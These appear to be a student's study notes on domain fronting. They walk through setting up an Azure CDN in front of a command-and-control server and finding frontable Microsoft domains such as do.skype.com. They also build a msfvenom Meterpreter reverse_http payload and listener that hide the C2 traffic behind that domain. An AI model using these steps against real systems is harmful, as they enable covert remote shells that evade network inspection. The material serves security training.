
At a very high level, this technique leverages the fact that large Content Delivery Networks (CDN) can be difficult to block or filter on a granular basis. Depending on the feature set supported by a CDN provider, domain fronting allows us to fetch arbitrary website content from a CDN, even though the initial TLS session is targeting a different domain. This is possible as the TLS and the HTTP session are handled independently. For example, we can initiate the TLS session to www.example1.com and then get the contents of www.example2.com.

With virtual hosting becoming a standard, multiple websites with different domain names can be hosted on a single IP

Example of nginx configuration:
```json
server {
	listen 80;
	listen [::]:80;
	root /var/www/example.com/html;
	index index.html index.htm index.nginx-debian.html;
	server_name example.com www.example.com;
	location / {
		try_files $uri $uri/ =404;
	}
}
```

But if a server runs TLS, the HTTP Host Header is only available after the secure channel is established. Now the server will use the TLS SNI field to specify the target domain and the certificate that is sent in response. 

![[Pasted image 20230618120648.png]]

We can abuse this by setting the SNI to point to `www.example1.com` but our Host Header to point to `www.example2.com`

When the server receives this, it will actually head over to `www.example2.com` instead.

This can bypass HTTPS Inspection too since it will only see the connection to `www.example1.com` but we got the content for `www.example2.com`

# Abusing CDNs

CDNs act as a sort of middle man that handles the content served by a server.

It can differentiate hosts by looking at the Host Header

![[Pasted image 20230618121221.png]]

In this Figure, www.example.com will point to the CDN endpoint’s domain name (e.g.: something.azureedge.net) through DNS Canonical Name (CNAME)550 records. When a client looks up www.example.com, the DNS will recursively lookup something.azureedge.net, which will be resolved by Azure. In this way, traffic will be directed to the CDN endpoint rather than the real server. Since CDN endpoints are used to serve content from multiple websites, the returned content is based on the Host header.

![[Pasted image 20230618121742.png]]

Let’s walk through the process demonstrated in Figure 142:
1. The client initiates a DNS request to its primary DNS server to look up the IP of good.com.
2. The primary DNS server asks the root DNS server for the IP address of good.com.
3. The server replies with the configured CNAME record for that domain, which is cdn1111.someprovider.com.
4. The primary DNS server queries the someprovider.com DNS server for the cdn1111.someprovider.com domain.
5. The DNS server for someprovider.com replies with 192.168.1.1, which is the IP of the CDN endpoint.
6. The primary DNS sends the reply to the client.
7. The client initiates a TLS session to domain good.com to the CDN endpoint.
8. The CDN endpoint serves the certificate for good.com.
9. The client asks for the cdn2222.someprovider.com resource.
10. The CDN endpoint serves the contents of malicious.com.

# Domain Fronting with Azure CDN

To set up a CDN in Azure, we’ll select Create Resource from the Home screen. A search screen is displayed where we can search for various resources and services offered by Azure. Here, we need to search for “CDN”.

![[Pasted image 20230618122306.png]]

If we find CDN, we click create

![[Pasted image 20230618122339.png]]

![[Pasted image 20230618122456.png]]

- Name: This field is arbitrary. We can give it any name we like.
- Subscription: This is the subscription that will be used to pay for the service.
- Resource group: The CDN profile must belong to a resource group. We can either select an existing one or create a new one. For this example, we’ll create a new one, adding “-rg” to the end of the name.
- RG location: An arbitrary geographic area where we want to host the CDN.
- Pricing tier: We’ll select “Standard Verizon”. This affects not only the pricing, but also the features we will have access to, and will also affect the way the CDN works. We found “Standard Verizon” to be the most reliable for our needs. The “Standard Microsoft” tier creates issues with TLS and the caching is also not as flexible.
- CDN endpoint name: The hostname we will use in the HTTP header to access meterpreter.info. This can be anything that is available from Azure, and the suffix will be azureedge.net.
- Origin type: This should be set to “Custom origin”.
- Origin hostname: This would be the actual website that should be cached by CDN under normal cases. In our case, this is the domain where we host our C2 server.

Once we populate all the details and click Create, Azure creates the CDN profile.

![[Pasted image 20230618122628.png]]

Once the profile is ready, we can navigate to Home > All Resources, select our newly created CDN profile, and we can confirm that it’s working in the Overview section.

![[Pasted image 20230618122657.png]]

Next, we need to disable caching. Caching will break our C2 channel, especially our reverse shells since they are not static and each request returns a unique response.

To disable caching, we’ll select our Endpoint and Caching rules. There, we’ll set Caching behavior to “Bypass cache”, which will disable caching.

![[Pasted image 20230618122750.png]]

We can also set Query string caching behavior to “Bypass caching for query strings”, which will prevent the CDN from caching any requests containing query strings.

Now test the connection, first create a Python HTTP server in the ubuntu machine that hosts the `meterpreter.info` domain:
```bash
sudo python3 -m http.server 80
```

Now a short Python script to handle HTTPS connections. This script will create an SSL wrapper around the default HTTP request handler, SimpleHTTPRequestHandler, which was used in the example above.

```python
from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl
import socketserver

httpd = socketserver.TCPServer(('138.68.99.177', 443), SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket(httpd.socket,
	keyfile="key.pem",
	certfile='cert.pem', server_side=True)

httpd.serve_forever()
```

Now test the connection with `curl`:
```bash
kali@kali:~$ curl http://offensive-security.azureedge.net
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /</title>
<body>
<h2>Directory listing for /</h2>
<hr>
<ul>
</ul>
<hr>
</body>
</html>
kali@kali:~$ curl -k https://offensive-security.azureedge.net
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
"http://www.w3.org/TR/html4/strict.dtd">
<title>Directory listing for /</title>
<body>
<h2>Directory listing for /</h2>
<hr>
<ul>
</ul>
<hr>
</body>
</html>
```

Now we need to find frontables domain, since we are using azure, we must host our domain in azure as well

We can use the FindFrontableDomains to find usable domains
```
kali@kali:~# git clone https://github.com/rvrsh3ll/FindFrontableDomains
kali@kali:~# cd FindFrontableDomains/
kali@kali:~/FindFrontableDomains# sudo ./setup.sh
```

Now we can search for frontable domains. For each domain, FindFrontableDomains will try to find subdomains using various services, and determine if they are hosted on a CDN network.

If we don’t have a specific target in mind, we’ll simply use trial and error. For this example, we can make an educated guess that since Microsoft owns Azure, some of their domains, like microsoft.com, outlook.com, or skype.com may be hosted there.

Let’s start by scanning for frontable domains in outlook.com by passing --domain outlook.com to FindFrontableDomains.py.
```python
kali@kali:~$ python3 FindFrontableDomains.py --domain outlook.com
...
[-] Enumerating subdomains now for outlook.com
[-] Searching now in Baidu..
[-] Searching now in Yahoo..
[-] Searching now in Google..
[-] Searching now in Bing..
[-] Searching now in Ask..
[-] Searching now in Netcraft..
[-] Searching now in DNSdumpster..
[-] Searching now in Virustotal..
[-] Searching now in ThreatCrowd..
[-] Searching now in SSL Certificates..
[-] Searching now in PassiveDNS..
[-] Total Unique Subdomains Found: 2553
www.outlook.com
(...)
recommended.yggdrasil.outlook.com
---------------------------------------------------------
Starting search for frontable domains...
Azure Frontable domain found: assets.outlook.com outlook-assets.azureedge.net.
Azure Frontable domain found: assets.outlook.com outlook-assets.afd.azureedge.net.
Search complete!
```

From the output of this command:
```bash
curl --header "Host: offensive-security.azureedge.net" http://assets.outlook.com
```

Since it returns nothing, it means the CDN for `assets.outlook.com` is in a different region or pricing tier which affects our ability to use it for fronting

We can also look for `skype.com`:
```
kali@kali:~$ python3 FindFrontableDomains.py --domain skype.com
...
Starting search for frontable domains...
Azure Frontable domain found: clientlogin.cdn.skype.com az866562.vo.msecnd.net.
Azure Frontable domain found: latest-swx.cdn.skype.com e458.wpc.azureedge.net.
Azure Frontable domain found: mrrcountries.cdn.skype.com mrrcountries.azureedge.net.
Azure Frontable domain found: mrrcountries.cdn.skype.com
mrrcountries.ec.azureedge.net.
Azure Frontable domain found: latest-swc.cdn.skype.com latest-swc.azureedge.net.
Azure Frontable domain found: latest-swc.cdn.skype.com latest-swc.ec.azureedge.net.
Azure Frontable domain found: swx.cdn.skype.com e458.wpc.azureedge.net.
Azure Frontable domain found: swc.cdn.skype.com swc.azureedge.net.
Azure Frontable domain found: swc.cdn.skype.com swc.ec.azureedge.net.
Azure Frontable domain found: s4w.cdn.skype.com az663213.vo.msecnd.net.
Azure Frontable domain found: sdk.cdn.skype.com az805177.vo.msecnd.net.
Azure Frontable domain found: do.skype.com skype-do.azureedge.net.
Azure Frontable domain found: do.skype.com skype-do.ec.azureedge.net.
Search complete!
```

Looking at `do.skype.com`:
```bash
kali@kali:~$ curl --header "Host: offensive security.azureedge.net" http://do.skype.com
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /</title>
<body>
<h2>Directory listing for /</h2>
<hr>
<ul>
</ul>
<hr>
</body>
</html>
```

We see it produces more output, if we use wireshark and perform the curl command again:
![[Pasted image 20230618194232.png]]

This reveals that do.skype.com is a CNAME record. After several requests, the server returns the 152.199.19.161 IP address.

We can see our HTTP web server:
![[Pasted image 20230618194349.png]]

We see the Host header being set to offensive-security.azureedge.net, which routes the traffic to our CDN, ultimately fetching the contents from our webserver at meterpreter.info. This confirms that our domain fronting works with HTTP. The problem with this is that a proxy can still see this traffic as it is unencrypted.

Let's try using HTTPS:
![[Pasted image 20230618194630.png]]

Wireshark reveals encrypted HTTPS traffic to the same IP as our previous test.

The certificate in the TLS key exchange is Microsoft’s certificate. We can verify this by selecting the Certificate, Server Key Exchange, Server Hello Done packet, and inspecting its details:
![[Pasted image 20230618194700.png]]

The last item we need to test is that our reverse shell is working properly. We’ll use HTTP so we can inspect the traffic contents, allowing us to verify that the connection is being set up as intended.

First, we’ll create a reverse shell payload. The only extra field we need to set is the HttpHostHeader, which will set the Host header in HTTP.
```bash
kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_http LHOST=do.skype.com LPORT=80 HttpHostHeader=offensive-security.azureedge.net -f exe > http-df.exe
```

When we use a staged payload, there are some additional settings we need to configure for our listener.

The first stage will set the address for the second stage based on the actual IP address and port of the listener. This won’t work for us because it will directly connect to our real IP. Since we obviously want to hide communication to this IP, we’ll need to ensure that the second stage is also connecting to do.skype.com.

To do this, we’ll need to set up some advanced options for our listener. We need to set the OverrideLHOST option to our domain, and also set OverrideRequestHost to “true”. We can change the listening port as well with the OverrideLPORT option, but this is unnecessary for this example.

Once this is set up we will start the listener with run -j, which will run the listener as a job.
```bash
msf5 exploit(multi/handler) > set LHOST do.skype.com
msf5 exploit(multi/handler) > set OverrideLHOST do.skype.com
msf5 exploit(multi/handler) > set OverrideRequestHost true
msf5 exploit(multi/handler) > set HttpHostHeader offensive-security.azureedge.net
msf5 exploit(multi/handler) > run -j
...
[-] Handler failed to bind to 152.199.19.161:80
[*] Started HTTP reverse handler on http://0.0.0.0:80
```

